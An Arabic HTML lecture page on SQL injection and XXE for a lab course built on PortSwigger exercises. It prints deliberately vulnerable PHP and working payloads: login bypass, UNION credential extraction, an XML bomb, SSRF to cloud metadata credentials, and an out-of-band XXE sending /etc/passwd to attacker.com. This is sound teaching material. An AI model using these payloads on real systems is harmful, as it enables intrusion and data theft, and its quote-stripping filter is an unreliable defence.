<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>محاضرة SQL Injection + XXE Injection - ساعتان</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a1a 50%, #2d2d2d 100%);
            color: #e0e0e0;
            line-height: 1.6;
            min-height: 100vh;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }

        .header {
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            padding: 30px 0;
            text-align: center;
            margin-bottom: 30px;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
        }

        .header h1 {
            color: #ffffff;
            font-size: 2.5em;
            margin-bottom: 10px;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
        }

        .header p {
            color: #b8d4f0;
            font-size: 1.2em;
        }

        .nav-menu {
            background: rgba(25, 25, 25, 0.95);
            backdrop-filter: blur(10px);
            padding: 10px 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            position: sticky;
            top: 10px;
            z-index: 100;
            box-shadow: 0 3px 15px rgba(0, 0, 0, 0.4);
        }

        .nav-menu ul {
            list-style: none;
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 8px;
            align-items: center;
        }

        .nav-menu a {
            color: #64b5f6;
            text-decoration: none;
            padding: 4px 8px;
            border-radius: 4px;
            transition: all 0.3s ease;
            font-weight: 400;
            font-size: 0.75em;
            white-space: nowrap;
        }

        .nav-menu a:hover {
            background: #64b5f6;
            color: #1a1a1a;
            transform: translateY(-1px);
        }

        .content-section {
            background: rgba(30, 30, 30, 0.8);
            backdrop-filter: blur(10px);
            margin-bottom: 30px;
            padding: 30px;
            border-radius: 15px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3);
        }

        .progress-bar {
            position: fixed;
            top: 0;
            left: 0;
            width: 0%;
            height: 4px;
            background: linear-gradient(90deg, #64b5f6, #81c784);
            z-index: 1000;
            transition: width 0.3s ease;
        }

        .back-to-top {
            position: fixed;
            bottom: 30px;
            left: 30px;
            width: 50px;
            height: 50px;
            background: linear-gradient(135deg, #64b5f6, #42a5f5);
            color: white;
            border: none;
            border-radius: 50%;
            cursor: pointer;
            opacity: 0;
            visibility: hidden;
            transition: all 0.3s ease;
            z-index: 1000;
        }

        .back-to-top.show {
            opacity: 1;
            visibility: visible;
        }

        .back-to-top:hover {
            transform: translateY(-3px);
            box-shadow: 0 5px 15px rgba(100, 181, 246, 0.4);
        }

        pre {
            background: #1e1e1e;
            border: 1px solid #333;
            border-radius: 8px;
            padding: 20px;
            margin: 15px 0;
            overflow-x: auto;
            position: relative;
        }

        code {
            font-family: 'Courier New', Courier, monospace;
            font-size: 0.9em;
        }

        .copy-btn {
            position: absolute;
            top: 10px;
            left: 10px;
            background: rgba(100, 181, 246, 0.8);
            color: white;
            border: none;
            padding: 5px 10px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 0.8em;
            opacity: 0;
            transition: opacity 0.3s ease;
        }

        pre:hover .copy-btn {
            opacity: 1;
        }

        .copy-btn:hover {
            background: rgba(100, 181, 246, 1);
        }

        h1, h2, h3, h4 {
            color: #64b5f6;
            margin: 20px 0 15px 0;
        }

        h1 { font-size: 2.2em; }
        h2 { font-size: 1.8em; }
        h3 { font-size: 1.5em; }
        h4 { font-size: 1.2em; }

        .alert {
            padding: 15px;
            margin: 15px 0;
            border-radius: 8px;
            border-right: 4px solid;
        }

        .alert-warning {
            background: rgba(255, 193, 7, 0.1);
            border-color: #ffc107;
            color: #fff3cd;
        }

        .alert-danger {
            background: rgba(220, 53, 69, 0.1);
            border-color: #dc3545;
            color: #f8d7da;
        }

        .alert-info {
            background: rgba(13, 202, 240, 0.1);
            border-color: #0dcaf0;
            color: #d1ecf1;
        }

        @media (max-width: 768px) {
            .nav-menu {
                padding: 10px;
            }
            
            .nav-menu ul {
                gap: 6px;
                flex-wrap: wrap;
            }
            
            .nav-menu a {
                padding: 4px 8px;
                font-size: 0.8em;
            }
            
            .container {
                padding: 10px;
            }
        }
    </style>
</head>
<body>
    <div class="progress-bar" id="progressBar"></div>
    
    <div class="container">
        <div class="header">
            <h1><i class="fas fa-shield-alt"></i> محاضرة أمان تطبيقات الويب</h1>
            <p>SQL Injection + XXE Injection - دليل شامل لمدة ساعتين</p>
        </div>

        <nav class="nav-menu">
            <ul>
                <li><a href="#table-of-contents"><i class="fas fa-list"></i> المحتويات</a></li>
                <li><a href="#sql-concepts"><i class="fas fa-database"></i> SQL - المفاهيم</a></li>
                <li><a href="#sql-error"><i class="fas fa-bug"></i> Error-Based</a></li>
                <li><a href="#sql-union"><i class="fas fa-link"></i> Union-Based</a></li>
                <li><a href="#sql-blind"><i class="fas fa-eye-slash"></i> Boolean Blind</a></li>
                <li><a href="#sql-labs"><i class="fas fa-flask"></i> SQL - المختبرات</a></li>
                <li><a href="#xxe-concepts"><i class="fas fa-code"></i> XXE - المفاهيم</a></li>
                <li><a href="#xxe-file"><i class="fas fa-file-alt"></i> File Disclosure</a></li>
                <li><a href="#xxe-ssrf"><i class="fas fa-server"></i> SSRF</a></li>
                <li><a href="#xxe-bomb"><i class="fas fa-bomb"></i> XML Bomb</a></li>
                <li><a href="#xxe-oob"><i class="fas fa-satellite-dish"></i> Out-of-Band</a></li>
                <li><a href="#xxe-labs"><i class="fas fa-vial"></i> XXE - المختبرات</a></li>
                <li><a href="#protection"><i class="fas fa-shield-alt"></i> الحماية</a></li>
            </ul>
        </nav>

        <div id="content">
            <div class="content-section" id="table-of-contents">
                <h2><i class="fas fa-list-ul"></i> محتويات المحاضرة</h2>
                <div class="alert alert-info">
                    <strong>مدة المحاضرة:</strong> ساعتان كاملتان مع 6 مختبرات عملية من PortSwigger
                </div>
                
                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 30px; margin-top: 20px;">
                    <div>
                        <h4><i class="fas fa-database"></i> SQL Injection (60 دقيقة)</h4>
                        <ul>
                            <li><i class="fas fa-info-circle"></i> المفاهيم الأساسية</li>
                            <li><i class="fas fa-exclamation-triangle"></i> أسباب الثغرة</li>
                            <li><i class="fas fa-list-ol"></i> الأنواع الثلاثة:
                                <ul style="margin-right: 20px; margin-top: 5px;">
                                    <li><i class="fas fa-bug"></i> Error-Based</li>
                                    <li><i class="fas fa-link"></i> Union-Based</li>
                                    <li><i class="fas fa-eye-slash"></i> Boolean Blind</li>
                                </ul>
                            </li>
                            <li><i class="fas fa-flask"></i> 3 مختبرات عملية</li>
                        </ul>
                    </div>
                    
                    <div>
                        <h4><i class="fas fa-code"></i> XXE Injection (60 دقيقة)</h4>
                        <ul>
                            <li><i class="fas fa-info-circle"></i> XML والكيانات الخارجية</li>
                            <li><i class="fas fa-exclamation-triangle"></i> مخاطر معالجة XML</li>
                            <li><i class="fas fa-list-ol"></i> الأنواع الأربعة:
                                <ul style="margin-right: 20px; margin-top: 5px;">
                                    <li><i class="fas fa-file-alt"></i> File Disclosure</li>
                                    <li><i class="fas fa-server"></i> SSRF</li>
                                    <li><i class="fas fa-bomb"></i> XML Bomb</li>
                                    <li><i class="fas fa-satellite-dish"></i> Out-of-Band</li>
                                </ul>
                            </li>
                            <li><i class="fas fa-vial"></i> 3 مختبرات عملية</li>
                        </ul>
                    </div>
                </div>
            </div>

            <div class="content-section" id="sql-concepts">
                <h2><i class="fas fa-database"></i> SQL Injection - المفاهيم الأساسية</h2>
                
                <div class="alert alert-danger">
                    <strong><i class="fas fa-exclamation-triangle"></i> تحذير:</strong> 
                    SQL Injection هي من أخطر الثغرات في تطبيقات الويب وتحتل المرتبة الأولى في قائمة OWASP Top 10.
                </div>

                <h3>ما هي SQL Injection؟</h3>
                <p>SQL Injection هي تقنية هجوم يستطيع من خلالها المهاجم إدخال أو "حقن" كود SQL ضار في استعلامات قاعدة البيانات. يحدث هذا عندما يتم دمج مدخلات المستخدم مباشرة في استعلامات SQL دون تنظيف أو تحقق مناسب.</p>

                <h3>مثال بسيط على الثغرة</h3>
                <pre><code class="language-php">// ❌ كود ضعيف وخطير
$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
$result = mysql_query($query);</code></pre>

                <h3>كيف يستغل المهاجم هذه الثغرة؟</h3>
                <p>يمكن للمهاجم إدخال القيم التالية:</p>
                <ul>
                    <li><strong>Username:</strong> <code>admin' --</code></li>
                    <li><strong>Password:</strong> <code>أي شيء</code></li>
                </ul>

                <p>سيصبح الاستعلام كالتالي:</p>
                <pre><code class="language-sql">SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'أي شيء'</code></pre>

                <div class="alert alert-warning">
                    <strong>النتيجة:</strong> تم تجاوز فحص كلمة المرور بالكامل لأن <code>--</code> يعلق باقي الاستعلام!
                </div>
            </div>

            <div class="content-section" id="sql-error">
                <h2><i class="fas fa-bug"></i> Error-Based SQL Injection</h2>
                
                <h3>المفهوم</h3>
                <p>يعتمد هذا النوع على إثارة أخطاء في قاعدة البيانات للحصول على معلومات حساسة من رسائل الخطأ.</p>

                <h3>مثال على كود ضعيف</h3>
                <pre><code class="language-php">// ❌ كود ضعيف - يظهر أخطاء قاعدة البيانات
$id = $_GET['id'];
$query = "SELECT * FROM products WHERE id = $id";
$result = mysql_query($query) or die(mysql_error());</code></pre>

                <h3>الهجوم</h3>
                <p>المهاجم يدخل:</p>
                <pre><code class="language-sql">?id=1' AND (SELECT COUNT(*) FROM information_schema.tables)='</code></pre>

                <h3>النتيجة</h3>
                <p>سيظهر خطأ يكشف معلومات عن بنية قاعدة البيانات:</p>
                <pre><code class="language-text">MySQL Error: You have an error in your SQL syntax near ''1'' AND (SELECT COUNT(*) FROM information_schema.tables)=''' at line 1</code></pre>

                <div class="alert alert-info">
                    <strong>PortSwigger Lab 1:</strong> سيتم تطبيق هذا النوع في المختبر الأول
                </div>
            </div>

            <div class="content-section" id="sql-union">
                <h2><i class="fas fa-link"></i> Union-Based SQL Injection</h2>
                
                <h3>المفهوم</h3>
                <p>يستخدم الأمر <code>UNION SELECT</code> لدمج نتائج الاستعلام الأصلي مع استعلام ضار لاستخراج البيانات.</p>

                <h3>مثال على كود ضعيف</h3>
                <pre><code class="language-php">// ❌ كود ضعيف
$category = $_GET['category'];
$query = "SELECT name, price FROM products WHERE category = '$category'";
$result = mysql_query($query);</code></pre>

                <h3>الهجوم</h3>
                <p>المهاجم يدخل:</p>
                <pre><code class="language-sql">?category=electronics' UNION SELECT username, password FROM users --</code></pre>

                <h3>الاستعلام الناتج</h3>
                <pre><code class="language-sql">SELECT name, price FROM products WHERE category = 'electronics' 
UNION SELECT username, password FROM users --'</code></pre>

                <h3>النتيجة</h3>
                <p>سيتم عرض أسماء المستخدمين وكلمات المرور بدلاً من أسماء المنتجات والأسعار!</p>

                <div class="alert alert-info">
                    <strong>PortSwigger Lab 2:</strong> سيتم تطبيق هذا النوع في المختبر الثاني
                </div>
            </div>

            <div class="content-section" id="sql-blind">
                <h2><i class="fas fa-eye-slash"></i> Boolean-Based Blind SQL Injection</h2>
                
                <h3>المفهوم</h3>
                <p>عندما لا يعرض التطبيق أخطاء أو بيانات مباشرة، يمكن للمهاجم استنتاج المعلومات من خلال ملاحظة الاختلاف في استجابة التطبيق (صحيح/خطأ).</p>

                <h3>مثال على كود ضعيف</h3>
                <pre><code class="language-php">// ❌ كود ضعيف - لا يظهر أخطاء لكن يمكن استغلاله
$id = $_GET['id'];
$query = "SELECT * FROM products WHERE id = $id AND published = 1";
$result = mysql_query($query);

if(mysql_num_rows($result) > 0) {
    echo "المنتج موجود";
} else {
    echo "المنتج غير موجود";
}</code></pre>

                <h3>الهجوم</h3>
                <p>المهاجم يختبر:</p>
                <pre><code class="language-sql">?id=1 AND 1=1  -- يعرض "المنتج موجود"
?id=1 AND 1=2  -- يعرض "المنتج غير موجود"</code></pre>

                <p>ثم يستخرج البيانات حرف بحرف:</p>
                <pre><code class="language-sql">?id=1 AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a'</code></pre>

                <div class="alert alert-info">
                    <strong>PortSwigger Lab 3:</strong> سيتم تطبيق هذا النوع في المختبر الثالث
                </div>
            </div>

            <div class="content-section" id="sql-labs">
                <h2><i class="fas fa-flask"></i> مختبرات SQL Injection العملية</h2>
                
                <div class="alert alert-info">
                    <strong>المطلوب:</strong> تسجيل الدخول إلى PortSwigger Web Security Academy وحل المختبرات التالية
                </div>

                <h3>المختبر الأول: Error-Based SQLi</h3>
                <div style="background: rgba(40, 40, 40, 0.8); padding: 20px; border-radius: 10px; margin: 15px 0;">
                    <h4>🔗 الرابط</h4>
                    <p><a href="https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data" target="_blank">SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</a></p>
                    
                    <h4>🎯 الهدف</h4>
                    <p>استخدام SQL injection لعرض جميع المنتجات بما في ذلك المنتجات غير المنشورة</p>
                    
                    <h4>💡 التلميح</h4>
                    <p>استخدم <code>'+OR+1=1--</code> في نهاية URL</p>
                </div>

                <h3>المختبر الثاني: Union-Based SQLi</h3>
                <div style="background: rgba(40, 40, 40, 0.8); padding: 20px; border-radius: 10px; margin: 15px 0;">
                    <h4>🔗 الرابط</h4>
                    <p><a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns" target="_blank">SQL injection UNION attack, determining the number of columns</a></p>
                    
                    <h4>🎯 الهدف</h4>
                    <p>تحديد عدد الأعمدة في الاستعلام باستخدام UNION SELECT</p>
                    
                    <h4>💡 التلميح</h4>
                    <p>جرب <code>'+UNION+SELECT+NULL--</code> ثم زد عدد NULL حتى يعمل</p>
                </div>

                <h3>المختبر الثالث: Blind SQLi</h3>
                <div style="background: rgba(40, 40, 40, 0.8); padding: 20px; border-radius: 10px; margin: 15px 0;">
                    <h4>🔗 الرابط</h4>
                    <p><a href="https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses" target="_blank">Blind SQL injection with conditional responses</a></p>
                    
                    <h4>🎯 الهدف</h4>
                    <p>استخراج كلمة مرور المستخدم administrator</p>
                    
                    <h4>💡 التلميح</h4>
                    <p>استخدم cookie TrackingId واختبر <code>'+AND+'1'='1</code></p>
                </div>
            </div>

            <div class="content-section" id="xxe-concepts">
                <h2><i class="fas fa-code"></i> XXE Injection - المفاهيم الأساسية</h2>
                
                <div class="alert alert-danger">
                    <strong><i class="fas fa-exclamation-triangle"></i> تحذير:</strong> 
                    XXE يمكن أن يؤدي إلى قراءة ملفات النظام، SSRF، وحتى تنفيذ أكواد عن بُعد.
                </div>

                <h3>ما هي XXE؟</h3>
                <p>XML External Entity (XXE) هي ثغرة تحدث عندما يقوم التطبيق بمعالجة مدخلات XML تحتوي على مراجع للكيانات الخارجية دون تحقق مناسب.</p>

                <h3>مثال على XML عادي</h3>
                <pre><code class="language-xml">&lt;?xml version="1.0"?&gt;
&lt;user&gt;
    &lt;name&gt;أحمد&lt;/name&gt;
    &lt;email&gt;ahmed@example.com&lt;/email&gt;
&lt;/user&gt;</code></pre>

                <h3>مثال على XXE ضار</h3>
                <pre><code class="language-xml">&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE user [
    &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
]&gt;
&lt;user&gt;
    &lt;name&gt;&amp;xxe;&lt;/name&gt;
    &lt;email&gt;ahmed@example.com&lt;/email&gt;
&lt;/user&gt;</code></pre>

                <div class="alert alert-warning">
                    <strong>النتيجة:</strong> سيتم قراءة محتويات ملف <code>/etc/passwd</code> وعرضها في حقل الاسم!
                </div>
            </div>

            <div class="content-section" id="xxe-file">
                <h2><i class="fas fa-file-alt"></i> File Disclosure XXE</h2>
                
                <h3>المفهوم</h3>
                <p>يمكن للمهاجم قراءة ملفات النظام المحلي باستخدام <code>file://</code> protocol.</p>

                <h3>مثال على كود ضعيف</h3>
                <pre><code class="language-php">// ❌ كود ضعيف - يعالج XML دون حماية
$xml = $_POST['xml_data'];
$doc = new DOMDocument();
$doc->loadXML($xml);  // خطير!

$name = $doc->getElementsByTagName('name')->item(0)->nodeValue;
echo "مرحباً " . $name;</code></pre>

                <h3>الهجوم</h3>
                <pre><code class="language-xml">&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE user [
    &lt;!ENTITY file SYSTEM "file:///etc/passwd"&gt;
]&gt;
&lt;user&gt;
    &lt;name&gt;&amp;file;&lt;/name&gt;
&lt;/user&gt;</code></pre>

                <h3>النتيجة</h3>
                <p>سيتم عرض محتويات ملف كلمات المرور!</p>

                <div class="alert alert-info">
                    <strong>PortSwigger Lab 4:</strong> سيتم تطبيق هذا النوع في المختبر الرابع
                </div>
            </div>

            <div class="content-section" id="xxe-ssrf">
                <h2><i class="fas fa-server"></i> SSRF via XXE</h2>
                
                <h3>المفهوم</h3>
                <p>يمكن استخدام XXE لإجراء طلبات HTTP إلى خوادم داخلية أو خارجية (Server-Side Request Forgery).</p>

                <h3>الهجوم</h3>
                <pre><code class="language-xml">&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE user [
    &lt;!ENTITY ssrf SYSTEM "http://localhost:8080/admin"&gt;
]&gt;
&lt;user&gt;
    &lt;name&gt;&amp;ssrf;&lt;/name&gt;
&lt;/user&gt;</code></pre>

                <h3>النتيجة</h3>
                <p>سيقوم الخادم بإجراء طلب HTTP إلى <code>localhost:8080/admin</code> وإرجاع المحتوى!</p>

                <div class="alert alert-info">
                    <strong>PortSwigger Lab 5:</strong> سيتم تطبيق هذا النوع في المختبر الخامس
                </div>
            </div>

            <div class="content-section" id="xxe-bomb">
                <h2><i class="fas fa-bomb"></i> XML Bomb (DoS)</h2>
                
                <h3>المفهوم</h3>
                <p>يمكن إنشاء XML يستهلك موارد الخادم بشكل كبير مما يؤدي إلى إيقاف الخدمة.</p>

                <h3>الهجوم</h3>
                <pre><code class="language-xml">&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE bomb [
    &lt;!ENTITY a "aaaaaaaaaaaaaaaaaaaa"&gt;
    &lt;!ENTITY b "&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;"&gt;
    &lt;!ENTITY c "&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;"&gt;
    &lt;!ENTITY d "&amp;c;&amp;c;&amp;c;&amp;c;&amp;c;&amp;c;&amp;c;&amp;c;"&gt;
]&gt;
&lt;bomb&gt;&amp;d;&lt;/bomb&gt;</code></pre>

                <div class="alert alert-danger">
                    <strong>تحذير:</strong> هذا المثال يمكن أن يستهلك جيجابايتات من الذاكرة!
                </div>
            </div>

            <div class="content-section" id="xxe-oob">
                <h2><i class="fas fa-satellite-dish"></i> Out-of-Band XXE</h2>
                
                <h3>المفهوم</h3>
                <p>عندما لا يعرض التطبيق محتوى الكيان مباشرة، يمكن إرسال البيانات إلى خادم خارجي.</p>

                <h3>الهجوم</h3>
                <pre><code class="language-xml">&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE user [
    &lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
    &lt;!ENTITY % eval "
        &lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'&gt;
    "&gt;
    %eval;
]&gt;
&lt;user&gt;
    &lt;name&gt;test&lt;/name&gt;
&lt;/user&gt;</code></pre>

                <h3>النتيجة</h3>
                <p>سيتم إرسال محتويات الملف إلى <code>attacker.com</code>!</p>

                <div class="alert alert-info">
                    <strong>PortSwigger Lab 6:</strong> سيتم تطبيق هذا النوع في المختبر السادس
                </div>
            </div>

            <div class="content-section" id="xxe-labs">
                <h2><i class="fas fa-vial"></i> مختبرات XXE العملية</h2>
                
                <h3>المختبر الرابع: Basic XXE</h3>
                <div style="background: rgba(40, 40, 40, 0.8); padding: 20px; border-radius: 10px; margin: 15px 0;">
                    <h4>🔗 الرابط</h4>
                    <p><a href="https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files" target="_blank">Exploiting XXE using external entities to retrieve files</a></p>
                    
                    <h4>🎯 الهدف</h4>
                    <p>قراءة محتويات ملف <code>/etc/passwd</code></p>
                    
                    <h4>💡 التلميح</h4>
                    <p>استخدم Burp Suite لتعديل XML request</p>
                </div>

                <h3>المختبر الخامس: XXE to SSRF</h3>
                <div style="background: rgba(40, 40, 40, 0.8); padding: 20px; border-radius: 10px; margin: 15px 0;">
                    <h4>🔗 الرابط</h4>
                    <p><a href="https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf" target="_blank">Exploiting XXE to perform SSRF attacks</a></p>
                    
                    <h4>🎯 الهدف</h4>
                    <p>الوصول إلى metadata service على <code>http://169.254.169.254/</code></p>
                    
                    <h4>💡 التلميح</h4>
                    <p>استخدم <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/admin</code></p>
                </div>

                <h3>المختبر السادس: Blind XXE</h3>
                <div style="background: rgba(40, 40, 40, 0.8); padding: 20px; border-radius: 10px; margin: 15px 0;">
                    <h4>🔗 الرابط</h4>
                    <p><a href="https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction" target="_blank">Blind XXE with out-of-band interaction</a></p>
                    
                    <h4>🎯 الهدف</h4>
                    <p>استخدام Burp Collaborator للتأكد من وجود XXE</p>
                    
                    <h4>💡 التلميح</h4>
                    <p>استخدم Burp Collaborator client للحصول على subdomain</p>
                </div>
            </div>

            <div class="content-section" id="protection">
                <h2><i class="fas fa-shield-alt"></i> طرق الحماية الشاملة</h2>
                
                <h3>🛡️ الحماية من SQL Injection</h3>
                
                <h4>1. Prepared Statements (الأهم)</h4>
                <pre><code class="language-php">// ✅ آمن - PHP PDO
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);
$user = $stmt->fetch();</code></pre>

                <pre><code class="language-python"># ✅ آمن - Python
cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", 
               (username, password))</code></pre>

                <h4>2. Input Validation</h4>
                <pre><code class="language-php">// ✅ تحقق من المدخلات
function validateInput($input) {
    // إزالة المسافات
    $input = trim($input);
    // تحويل الأحرف الخاصة
    $input = htmlspecialchars($input);
    // فلترة SQL
    $input = preg_replace('/[\'";\\\\]/', '', $input);
    return $input;
}</code></pre>

                <h3>🛡️ الحماية من XXE</h3>
                
                <h4>1. تعطيل External Entities</h4>
                <pre><code class="language-php">// ✅ آمن - PHP
$doc = new DOMDocument();
$doc->resolveExternals = false;
$doc->substituteEntities = false;
libxml_disable_entity_loader(true);</code></pre>

                <pre><code class="language-python"># ✅ آمن - Python
from defusedxml import ElementTree as ET
tree = ET.parse(xml_file)  # آمن من XXE</code></pre>

                <pre><code class="language-java">// ✅ آمن - Java
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);</code></pre>

                <h4>2. استخدام مكتبات آمنة</h4>
                <pre><code class="language-bash"># Python - تثبيت defusedxml
pip install defusedxml</code></pre>

                <h4>3. عزل الخدمة</h4>
                <pre><code class="language-dockerfile"># Docker - عزل التطبيق
FROM alpine:latest
RUN adduser -D -s /bin/sh appuser
USER appuser
# منع الوصول لملفات النظام</code></pre>

                <div class="alert alert-info">
                    <strong>نصيحة:</strong> استخدم Web Application Firewall (WAF) كطبقة حماية إضافية، وليس كحل وحيد.
                </div>
            </div>
        </div>
    </div>

    <button class="back-to-top" id="backToTop">
        <i class="fas fa-arrow-up"></i>
    </button>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
    
    <script>
        // Wait for DOM to be fully loaded
        document.addEventListener('DOMContentLoaded', function() {
            // Initialize syntax highlighting
            if (window.Prism) {
                Prism.highlightAll();
            }
            
            // Add copy buttons to code blocks
            var codeBlocks = document.querySelectorAll('pre code');
            codeBlocks.forEach(function(block, index) {
                var button = document.createElement('button');
                button.className = 'copy-btn';
                button.innerHTML = '<i class="fas fa-copy"></i> نسخ';
                
                button.addEventListener('click', function() {
                    var text = block.textContent || block.innerText;
                    
                    if (navigator.clipboard && navigator.clipboard.writeText) {
                        navigator.clipboard.writeText(text).then(function() {
                            button.innerHTML = '<i class="fas fa-check"></i> تم النسخ';
                            setTimeout(function() {
                                button.innerHTML = '<i class="fas fa-copy"></i> نسخ';
                            }, 2000);
                        }).catch(function() {
                            // Fallback for older browsers
                            fallbackCopy(text, button);
                        });
                    } else {
                        fallbackCopy(text, button);
                    }
                });
                
                block.parentElement.appendChild(button);
            });
            
            // Fallback copy function
            function fallbackCopy(text, button) {
                var textArea = document.createElement('textarea');
                textArea.value = text;
                document.body.appendChild(textArea);
                textArea.select();
                try {
                    document.execCommand('copy');
                    button.innerHTML = '<i class="fas fa-check"></i> تم النسخ';
                    setTimeout(function() {
                        button.innerHTML = '<i class="fas fa-copy"></i> نسخ';
                    }, 2000);
                } catch (err) {
                    console.error('Copy failed:', err);
                }
                document.body.removeChild(textArea);
            }
            
            // Progress bar functionality
            function updateProgressBar() {
                var scrollTop = document.documentElement.scrollTop || document.body.scrollTop;
                var scrollHeight = document.documentElement.scrollHeight - document.documentElement.clientHeight;
                var scrolled = (scrollTop / scrollHeight) * 100;
                var progressBar = document.getElementById('progressBar');
                if (progressBar) {
                    progressBar.style.width = scrolled + '%';
                }
            }
            
            // Back to top button functionality
            function updateBackToTop() {
                var backToTop = document.getElementById('backToTop');
                if (backToTop) {
                    if (window.pageYOffset > 300) {
                        backToTop.classList.add('show');
                    } else {
                        backToTop.classList.remove('show');
                    }
                }
            }
            
            // Scroll event listener
            window.addEventListener('scroll', function() {
                updateProgressBar();
                updateBackToTop();
            });
            
            // Back to top click handler
            var backToTopBtn = document.getElementById('backToTop');
            if (backToTopBtn) {
                backToTopBtn.addEventListener('click', function() {
                    window.scrollTo({
                        top: 0,
                        behavior: 'smooth'
                    });
                });
            }
            
            // Smooth scrolling for anchor links
            document.addEventListener('click', function(e) {
                if (e.target.tagName === 'A' && e.target.getAttribute('href')) {
                    var href = e.target.getAttribute('href');
                    if (href.charAt(0) === '#') {
                        e.preventDefault();
                        var target = document.querySelector(href);
                        if (target) {
                            target.scrollIntoView({
                                behavior: 'smooth',
                                block: 'start'
                            });
                        }
                    }
                }
            });
        });
    </script>
</body>
</html> 